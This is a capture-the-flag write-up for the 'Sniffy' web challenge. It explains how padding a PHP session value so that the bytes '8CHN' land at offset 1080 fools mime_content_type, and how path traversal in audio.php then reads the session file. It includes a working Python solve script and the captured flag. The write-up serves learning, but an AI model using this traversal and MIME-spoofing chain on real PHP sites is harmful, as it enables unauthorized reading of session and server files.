---
ai_date: 2025-04-27 05:15:54
ai_summary: Mime spoofing exploit using path traversal to access session files and retrieve flag
ai_tags:
  - mime-spoofing
  - path-traversal
  - file-read
created: 2024-07-06T18:15
description: '"Erh, I think this is an audio file?"'
points: 223
solves: 58
title: Sniffy
updated: 2025-07-14T09:46
---

## Analysis

It appears that we are able to set `$_SESSION['theme']` to any arbitrary value.
We can also access files via `audio.php` but it does a mime check.

## Attack

PHP stores its session in `/tmp/sess_xxxx`, so if we use path traversal to get to it, `audio.php` will give us the flag.
But how do we pass the `mime == audio` check?

## Mime Spoofing

We will examine how exactly does `mime_content_type()` work.

> **mime_content_type** ([resource](https://www.php.net/manual/en/language.types.resource.php)|[string](https://www.php.net/manual/en/language.types.string.php)`$filename`):[string](https://www.php.net/manual/en/language.types.string.php)|[false](https://www.php.net/manual/en/language.types.value.php)
> 
> Returns the MIME content type for a file as determined by using information from the magic.mime file.

Hah! It's a lookup file.[^1]

[^1]: [PHP/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime at master · waviq/PHP (github.com)](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime)

Seems like we only have to place specific bytes in specific locations for this to work.

## Solve Script

```python
import requests
import urllib.parse

target = 'https://web-sniffy-d9920bbcf9df.2024.ductf.dev'
s = requests.Session()

# excerpt from php / magic.mime
'''
#audio/x-fasttracker-module
#>0	string	>\0		Title: "%s"
1080	string	8CHN		audio/x-mod
'''
for i in range(980, 1000):
    r = i*b'A' + b"8CHN"
    d = s.get(f"{target}/?theme[0]={urllib.parse.quote(r)}")
    d = s.get(f"{target}/audio.php?f=../../../../tmp/sess_{s.cookies.get('PHPSESSID')}")
    if d.status_code != 403:
        print(d.status_code, d.text)
        break
```

```
993 200 flag|s:52:"DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}";theme|a:1:{i:0;s:997:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8CHN";}
```